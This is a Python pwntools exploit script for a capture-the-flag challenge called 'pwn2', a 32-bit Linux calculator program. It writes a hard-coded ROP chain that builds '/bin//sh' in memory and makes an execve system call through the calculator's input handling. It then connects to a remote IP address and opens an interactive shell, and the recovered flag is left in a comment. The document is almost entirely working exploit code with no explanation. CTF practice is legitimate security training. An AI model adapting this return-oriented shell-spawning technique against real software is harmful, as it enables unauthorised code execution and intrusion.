#!/usr/bin/env python
from pwn import *
from struct import unpack
context(arch='i386', os='linux', log_level='debug')

rop = [
	0x0806ed0a,
	0x080ea060,
	0x080bb406,
	0x6e69622f,
	0x080a1dad,
	0x0806ed0a,
	0x080ea064,
	0x080bb406,
	0x68732f2f,
	0x080a1dad,
	0x0806ed0a,
	0x080ea068,
	0x08054730,
	0x080a1dad,
	0x080481c9,
	0x080ea060,
	0x0806ed31,
	0x080ea068,
	0x080ea060,
	0x0806ed0a,
	0x080ea068,
	0x08054730,
	0x0807b75f,
	0x0807b75f,
	0x0807b75f,
	0x0807b75f,
	0x0807b75f,
	0x0807b75f,
	0x0807b75f,
	0x0807b75f,
	0x0807b75f,
	0x0807b75f,
	0x0807b75f,
	0x08049781]


# pr = process('./pwn2') 
pr = remote('114.55.55.104', 8000)
# pr = remote('114.55.7.125', 8000)

pr.recvuntil('calculate:')
num1 = 14
times = num1 +len(rop)+1
print times
pr.sendline(str(times)) # 14 + 34 + 1


def foo(pr, num):
	pr.recvuntil('5 Save the result\n')
	pr.sendline('1')
	pr.recvuntil(':')
	pr.sendline(str(num))
	pr.recvuntil(':')
	pr.sendline('0')

for i in range(11): foo(pr, 0x41414141)
# foo(pr, times) # v6
foo(pr, 0)   # free(v7)
for i in range(2): foo(pr, 0x41414141) # v8 

for i in range(len(rop)): foo(pr, rop[i])

pr.recvuntil('5 Save the result\n')
pr.sendline('5')
pr.interactive()	


# flag{This_is_my_true_love}